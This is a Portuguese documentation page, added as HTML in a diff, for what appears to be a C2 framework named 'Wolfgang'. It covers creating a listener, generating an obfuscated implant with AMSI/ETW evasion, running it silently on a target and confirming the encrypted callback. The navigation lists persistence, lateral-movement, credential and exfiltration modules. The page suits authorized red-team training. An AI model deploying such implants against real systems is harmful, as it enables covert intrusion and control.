+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/persistence/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_5_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Persistence
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/windows-registry/">
+<span class="md-ellipsis">
+    
+  
+    Windows Registry
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/scheduled-tasks/">
+<span class="md-ellipsis">
+    
+  
+    Scheduled Tasks
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/linux-cron/">
+<span class="md-ellipsis">
+    
+  
+    Linux Cron
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/macos-launchd/">
+<span class="md-ellipsis">
+    
+  
+    macOS Launchd
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_6_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Lateral Movement
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/port-forwarding/">
+<span class="md-ellipsis">
+    
+  
+    Port Forwarding
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/socks-proxy/">
+<span class="md-ellipsis">
+    
+  
+    SOCKS Proxy
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/pivot-chains/">
+<span class="md-ellipsis">
+    
+  
+    Pivot Chains
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/remote-execution/">
+<span class="md-ellipsis">
+    
+  
+    Remote Execution
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_7" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../modules/">
+<span class="md-ellipsis">
+    
+  
+    Module Catalog
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_7">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Module Catalog
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/shell/">
+<span class="md-ellipsis">
+    
+  
+    Shell
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/fileops/">
+<span class="md-ellipsis">
+    
+  
+    File Operations
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/recon/">
+<span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/persist/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/lateral/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/credential/">
+<span class="md-ellipsis">
+    
+  
+    Credentials
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/exfil/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_8" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../api/">
+<span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_8_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_8">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    API Reference
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="primeiro-implant">Primeiro Implant<a class="headerlink" href="#primeiro-implant" title="Permanent link">¶</a></h1>
+<p>Nesta etapa voce vai criar um listener, gerar um implant customizado, executa-lo em um alvo de teste e ver o agent aparecer no teamserver. Antes de prosseguir, certifique-se de que completou o <a href="../quickstart/">Quickstart</a>.</p>
+<div class="admonition warning">
+<p class="admonition-title">Ambiente de Teste</p>
+<p>Execute implants apenas em ambientes autorizados. Use maquinas virtuais ou containers dedicados para testes.</p>
+</div>
+<h2 id="1-criar-um-listener-https">1. Criar um Listener HTTPS<a class="headerlink" href="#1-criar-um-listener-https" title="Permanent link">¶</a></h2>
+<p>O listener e o endpoint que recebe conexoes dos implants. O config padrao ja cria um listener HTTPS na porta 443, mas voce pode criar listeners adicionais pelo client.</p>
+<h3 id="via-repl-interativo">Via REPL interativo<a class="headerlink" href="#via-repl-interativo" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a>wolfgang &gt;&gt; listeners create
+<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a>Listener type (http/https/dns/ws): https
+<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a>Bind address [0.0.0.0]: 0.0.0.0
+<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a>Port: 443
+<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a>Profile [default]: default
+<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a>[+] Listener created: a1b2c3d4 (https on 0.0.0.0:443)
+</code></pre></div>
+<h3 id="verificar-listeners-ativos">Verificar listeners ativos<a class="headerlink" href="#verificar-listeners-ativos" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a>wolfgang &gt;&gt; listeners
+<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a>ID        TYPE   BIND      PORT  PROFILE  STATUS
+<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a>a1b2c3d4  https  0.0.0.0   443   default  running
+</code></pre></div>
+<h3 id="tipos-de-listener-suportados">Tipos de listener suportados<a class="headerlink" href="#tipos-de-listener-suportados" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Tipo</th>
+<th>Porta Tipica</th>
+<th>Uso</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>https</code></td>
+<td>443</td>
+<td>Comunicacao padrao, mistura com trafego web legitimo</td>
+</tr>
+<tr>
+<td><code>http</code></td>
+<td>80</td>
+<td>Ambientes sem inspacao TLS (menos seguro)</td>
+</tr>
+<tr>
+<td><code>dns</code></td>
+<td>53</td>
+<td>Exfiltracao por DNS queries, atravessa a maioria dos firewalls</td>
+</tr>
+<tr>
+<td><code>ws</code></td>
+<td>443/8080</td>
+<td>WebSocket, persistent connection, menor latencia</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-gerar-o-implant">2. Gerar o Implant<a class="headerlink" href="#2-gerar-o-implant" title="Permanent link">¶</a></h2>
+<p>O Wolfgang compila implants sob demanda com configuracao embutida via <code>-ldflags</code>. Cada implant e unico -- as chaves, URLs e parametros sao inseridos em tempo de compilacao.</p>
+<h3 id="via-cli-do-servidor-direto">Via CLI do servidor (direto)<a class="headerlink" href="#via-cli-do-servidor-direto" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a>wolfgang-server<span class="w"> </span>generate<span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="w">  </span>--os<span class="w"> </span>linux<span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">  </span>--arch<span class="w"> </span>amd64<span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">  </span>--transport<span class="w"> </span>https<span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-5" id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">  </span>--callback<span class="w"> </span>https://10.0.0.1:443<span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-6" id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="w">  </span>--sleep<span class="w"> </span><span class="m">5000</span><span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-7" id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="w">  </span>--jitter<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="se">\</span>
+<a href="#__codelineno-2-8" id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">  </span>--garble
+</code></pre></div>
+<p>Saida:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a>[+] Built: build/implant_linux_amd64 (2847523 bytes)
+<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a>[+] OS: linux, Arch: amd64
+</code></pre></div>
+<h3 id="via-repl-do-client">Via REPL do client<a class="headerlink" href="#via-repl-do-client" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a>wolfgang &gt;&gt; generate
+<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a>Target OS (linux/windows/darwin): linux
+<a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a>Target arch (amd64/arm64/386) [amd64]: amd64
+<a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a>Transport (https/dns/ws) [https]: https
+<a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a>Output type (implant/stager) [implant]: implant
+<a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a>Callback URL(s) (comma-separated): https://10.0.0.1:443
+<a href="#__codelineno-4-7" id="__codelineno-4-7" name="__codelineno-4-7"></a>Sleep interval (ms) [5000]: 5000
+<a href="#__codelineno-4-8" id="__codelineno-4-8" name="__codelineno-4-8"></a>Jitter (0-100) [10]: 10
+<a href="#__codelineno-4-9" id="__codelineno-4-9" name="__codelineno-4-9"></a>Format (exe/elf/macho) [exe]: elf
+<a href="#__codelineno-4-10" id="__codelineno-4-10" name="__codelineno-4-10"></a>Use garble obfuscation? (y/N): y
+<a href="#__codelineno-4-11" id="__codelineno-4-11" name="__codelineno-4-11"></a>Enable dynamic modules? (y/N): n
+<a href="#__codelineno-4-12" id="__codelineno-4-12" name="__codelineno-4-12"></a>[*] Building implant... this may take a moment.
+<a href="#__codelineno-4-13" id="__codelineno-4-13" name="__codelineno-4-13"></a>[+] Implant saved: implant_linux_amd64 (linux/amd64, 2847523 bytes)
+</code></pre></div>
+<h3 id="parametros-de-generate">Parametros de generate<a class="headerlink" href="#parametros-de-generate" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Default</th>
+<th>Descricao</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--os</code></td>
+<td>sistema atual</td>
+<td>OS alvo: <code>linux</code>, <code>windows</code>, <code>darwin</code></td>
+</tr>
+<tr>
+<td><code>--arch</code></td>
+<td>arch atual</td>
+<td>Arquitetura: <code>amd64</code>, <code>arm64</code>, <code>386</code></td>
+</tr>
+<tr>
+<td><code>--transport</code></td>
+<td><code>https</code></td>
+<td>Transporte primario: <code>https</code>, <code>dns</code>, <code>ws</code></td>
+</tr>
+<tr>
+<td><code>--callback</code></td>
+<td>(obrigatorio)</td>
+<td>URL(s) de callback -- primeira e primaria, demais sao fallback</td>
+</tr>
+<tr>
+<td><code>--sleep</code></td>
+<td><code>5000</code></td>
+<td>Intervalo de check-in em milissegundos</td>
+</tr>
+<tr>
+<td><code>--jitter</code></td>
+<td><code>10</code></td>
+<td>Variacao aleatoria no sleep (0-100%)</td>
+</tr>
+<tr>
+<td><code>--profile</code></td>
+<td>(nenhum)</td>
+<td>Nome do malleable profile</td>
+</tr>
+<tr>
+<td><code>--format</code></td>
+<td>auto pelo OS</td>
+<td>Formato de saida: <code>exe</code>, <code>elf</code>, <code>macho</code></td>
+</tr>
+<tr>
+<td><code>--garble</code></td>
+<td><code>true</code></td>
+<td>Usar garble para ofuscar strings</td>
+</tr>
+<tr>
+<td><code>-o</code> / <code>--output</code></td>
+<td><code>build/implant_&lt;os&gt;_&lt;arch&gt;</code></td>
+<td>Caminho de saida do binario</td>
+</tr>
+</tbody>
+</table>
+<h3 id="o-que-e-embutido-no-implant">O que e embutido no implant<a class="headerlink" href="#o-que-e-embutido-no-implant" title="Permanent link">¶</a></h3>
+<p>O build system usa <code>go build -ldflags -X</code> para injetar configuracao diretamente no binario:</p>
+<ul>
+<li>URL do callback (primario + fallbacks)</li>
+<li>Tipo de transporte</li>
+<li>Chave publica X25519 do servidor (key pinning)</li>
+<li>Intervalos de sleep/jitter</li>
+<li>Flags de evasao (AMSI, ETW, sandbox detection)</li>
+<li>Flags de modulos dinamicos</li>
+</ul>
+<p>O binario resultante e estaticamente linkado (<code>CGO_ENABLED=0</code>) e strip de simbolos (<code>-s -w</code>).</p>
+<h2 id="3-executar-no-alvo">3. Executar no Alvo<a class="headerlink" href="#3-executar-no-alvo" title="Permanent link">¶</a></h2>
+<p>Transfira o implant para o alvo de teste e execute:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c1"># No alvo (Linux)</span>
+<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>implant_linux_amd64
+<a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a>./implant_linux_amd64
+</code></pre></div>
+<p>Para Windows:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="c"># No alvo (Windows)</span>
+<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="p">.\</span><span class="n">implant_windows_amd64</span><span class="p">.</span><span class="n">exe</span>
+</code></pre></div>
+<p>O implant nao produz saida visivel no terminal. Toda comunicacao acontece silenciosamente em background.</p>
+<h3 id="fases-de-inicializacao-do-implant">Fases de inicializacao do implant<a class="headerlink" href="#fases-de-inicializacao-do-implant" title="Permanent link">¶</a></h3>
+<p>O implant executa as seguintes fases ao iniciar:</p>
+<ol>
+<li><strong>Auto-evasion</strong>: Verifica sandbox, patches AMSI/ETW se configurado</li>
+<li><strong>Transport chain</strong>: Inicializa transportes configurados (primario + fallbacks)</li>
+<li><strong>Registration</strong>: Key exchange ECDH com o servidor (detalhado abaixo)</li>
+<li><strong>Module system</strong>: Registra modulos estaticos, inicializa loader dinamico</li>
+<li><strong>Check-in loop</strong>: Entra no loop principal de check-in periodico</li>
+</ol>
+<h2 id="4-registro-do-agent">4. Registro do Agent<a class="headerlink" href="#4-registro-do-agent" title="Permanent link">¶</a></h2>
+<p>O processo de registro estabelece a sessao criptografada entre implant e servidor. Esse e o momento mais critico -- apos o registro, toda comunicacao subsequente usa criptografia autenticada.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    participant I as Implant
+    participant S as Servidor
+
+    Note over I: Gera keypair X25519 efemero
+    I-&gt;&gt;S: POST /register<br/>ephemeral_pub + sysinfo<br/>(hostname, OS, arch, user, IP)
+    Note over S: Gera keypair X25519 efemero
+    Note over S: Computa shared_secret = ECDH(server_priv, implant_pub)
+    Note over S: session_key = HKDF-SHA256(shared_secret, agent_id)
+    Note over S: Registra agent no SQLite
+    S-&gt;&gt;I: 200 OK<br/>agent_id + server_ephemeral_pub
+    Note over I: Verifica server_pub contra key pinned no build
+    Note over I: Computa shared_secret = ECDH(implant_priv, server_pub)
+    Note over I: session_key = HKDF-SHA256(shared_secret, agent_id)
+    Note over I: Descarta chave privada efemera (forward secrecy)
+    Note over I,S: Sessao estabelecida com AES-256-GCM
+</code></pre>
+<h3 id="detalhes-do-key-exchange">Detalhes do key exchange<a class="headerlink" href="#detalhes-do-key-exchange" title="Permanent link">¶</a></h3>
+<p>O Wolfgang usa <strong>X25519 ECDH</strong> (Elliptic Curve Diffie-Hellman) com chaves efemeras para estabelecer o segredo compartilhado:</p>
+<p><strong>Passo 1 -- Geracao de chaves</strong>: O implant gera um par de chaves X25519 efemero (usado apenas para este registro).</p>
+<p><strong>Passo 2 -- Registration request</strong>: O implant envia ao servidor:</p>
+<ul>
+<li>Chave publica efemera (hex-encoded)</li>
+<li>Metadados do sistema: hostname, OS, arch, username, IP</li>
+<li>Configuracao: transport, sleep, jitter</li>
+</ul>
+<p><strong>Passo 3 -- Key pinning</strong>: O implant verifica que a chave publica retornada pelo servidor corresponde a chave embutida em tempo de build (<code>ServerPublicKey</code>). Se nao corresponder, o registro e abortado. Isso previne ataques MITM.</p>
+<p><strong>Passo 4 -- Derivacao de segredo</strong>: Ambos os lados computam:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a>shared_secret = X25519(local_private, remote_public)
+<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a>session_key   = HKDF-SHA256(shared_secret, info=agent_id)
+</code></pre></div>
+<p>O <code>agent_id</code> e usado como info no HKDF, vinculando a chave de sessao a um agent especifico. Dois agents com o mesmo shared secret geram session keys diferentes.</p>
+<p><strong>Passo 5 -- Forward secrecy</strong>: A chave privada efemera do implant sai de escopo apos a derivacao. Mesmo se a chave persistente do servidor for comprometida no futuro, sessoes passadas permanecem seguras.</p>
+<h3 id="envelope-de-comunicacao">Envelope de comunicacao<a class="headerlink" href="#envelope-de-comunicacao" title="Permanent link">¶</a></h3>
+<p>Apos o registro, toda comunicacao usa o formato <strong>envelope</strong>:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a>+------------------+----------+--------+--------------+
+<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a>| Agent ID (16B)   | Type (2B)| Seq (4B)| Payload Len  |
+<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a>+------------------+----------+--------+--------------+
+<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a>| AES-256-GCM encrypted payload ...                   |
+<a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a>+-----------------------------------------------------+
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Campo</th>
+<th>Tamanho</th>
+<th>Descricao</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Agent ID</td>
+<td>16 bytes</td>
+<td>Identificador unico do agent</td>
+</tr>
+<tr>
+<td>Msg Type</td>
+<td>2 bytes</td>
+<td>1=Registration, 2=CheckIn, 3=TaskResponse, 4=TaskDispatch</td>
+</tr>
+<tr>
+<td>Sequence</td>
+<td>4 bytes</td>
+<td>Numero de sequencia (nonce para AES-GCM)</td>
+</tr>
+<tr>
+<td>Payload Len</td>
+<td>4 bytes</td>
+<td>Tamanho do payload criptografado</td>
+</tr>
+<tr>
+<td>Payload</td>
+<td>variavel</td>
+<td>Dados criptografados com AES-256-GCM usando a session key</td>
+</tr>
+</tbody>
+</table>
+<p>O header (26 bytes) e transmitido em cleartext. O payload e criptografado com a session key derivada no registro.</p>
+<h3 id="retentativas-de-registro">Retentativas de registro<a class="headerlink" href="#retentativas-de-registro" title="Permanent link">¶</a></h3>
+<p>Se o registro falhar (servidor indisponivel, erro de rede), o implant tenta novamente ate 10 vezes com backoff exponencial + jitter (delay base de 2 segundos + ate 3 segundos de jitter aleatorio). Apos esgotar as tentativas, o implant encerra silenciosamente (exit code 1).</p>
+<h2 id="5-verificar-o-agent">5. Verificar o Agent<a class="headerlink" href="#5-verificar-o-agent" title="Permanent link">¶</a></h2>
+<p>De volta ao client, o agent deve aparecer na lista:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a>wolfgang &gt;&gt; agents
+<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a>ID        HOSTNAME     OS     USER    LAST SEEN            TRANSPORT  STATUS
+<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>a1b2c3d4  target-vm    linux  root    2026-03-14 10:15:00  https      active
+</code></pre></div>
+<p>Para ver detalhes completos:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a>wolfgang &gt;&gt; use a1b2c3d4
+<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a>wolfgang [a1b2c3d4] &gt;&gt; info
+<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a>Agent ID:     a1b2c3d4-e5f6-7890-abcd-ef1234567890
+<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a>Hostname:     target-vm
+<a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a>OS/Arch:      linux/amd64
+<a href="#__codelineno-10-6" id="__codelineno-10-6" name="__codelineno-10-6"></a>Username:     root
+<a href="#__codelineno-10-7" id="__codelineno-10-7" name="__codelineno-10-7"></a>Internal IP:  192.168.1.100
+<a href="#__codelineno-10-8" id="__codelineno-10-8" name="__codelineno-10-8"></a>External IP:  203.0.113.50
+<a href="#__codelineno-10-9" id="__codelineno-10-9" name="__codelineno-10-9"></a>Transport:    https
+<a href="#__codelineno-10-10" id="__codelineno-10-10" name="__codelineno-10-10"></a>Sleep/Jitter: 5000ms / 10%
+<a href="#__codelineno-10-11" id="__codelineno-10-11" name="__codelineno-10-11"></a>Last Seen:    2026-03-14 10:15:00
+<a href="#__codelineno-10-12" id="__codelineno-10-12" name="__codelineno-10-12"></a>Status:       active
+</code></pre></div>
+<p>Se o WebSocket estiver conectado, voce recebe uma notificacao em tempo real quando o agent registra:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a>[EVENT] New agent registered: a1b2c3d4 (target-vm, linux/amd64)
+</code></pre></div>
+<h2 id="troubleshooting">Troubleshooting<a class="headerlink" href="#troubleshooting" title="Permanent link">¶</a></h2>
+<table>
+<thead>
+<tr>
+<th>Problema</th>
+<th>Solucao</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Agent nao aparece</td>
+<td>Verifique conectividade de rede entre alvo e listener. Firewall bloqueando porta?</td>
+</tr>
+<tr>
+<td><code>registration rejected: status 404</code></td>
+<td>Listener nao esta rodando. Verifique <code>listeners</code> no client</td>
+</tr>
+<tr>
+<td><code>server public key mismatch</code></td>
+<td>O implant foi gerado com uma chave diferente. Regere o implant</td>
+</tr>
+<tr>
+<td>Agent aparece e some</td>
+<td>Check-in interval muito longo. Aguarde o proximo check-in (default: 5s)</td>
+</tr>
+<tr>
+<td><code>registration exhausted, exiting</code></td>
+<td>10 tentativas falharam. Verifique URL de callback e acessibilidade</td>
+</tr>
+</tbody>
+</table>
+<h2 id="veja-tambem">Veja tambem<a class="headerlink" href="#veja-tambem" title="Permanent link">¶</a></h2>
+<ul>
+<li><a href="../first-operation/">Primeira Operacao</a> -- proximo passo: executar modulos no agent</li>
+<li><a href="../quickstart/">Quickstart</a> -- etapa anterior</li>
+<li><a href="../../architecture/crypto/">Arquitetura: Criptografia</a> -- detalhes do protocolo ECDH e envelope</li>
+</ul>
+</article>
+</div>
+<script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Voltar para o topo
+</button>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "content.tabs.link", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado para \u00e1rea de transfer\u00eancia", "clipboard.copy": "Copiar para \u00e1rea de transfer\u00eancia", "search.result.more.one": "mais 1 nesta p\u00e1gina", "search.result.more.other": "# mais nesta p\u00e1gina", "search.result.none": "Nenhum documento encontrado", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Digite para iniciar a busca", "search.result.term.missing": "Ausente", "select.version": "Selecione a vers\u00e3o"}, "version": null}</script>
+<script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+<script type="module">import mermaid from "https://unpkg.com/mermaid@10.4.0/dist/mermaid.esm.min.mjs";
+window.mermaidConfig = {default: {
+    startOnLoad: false
+}};</script></body>
+</html>
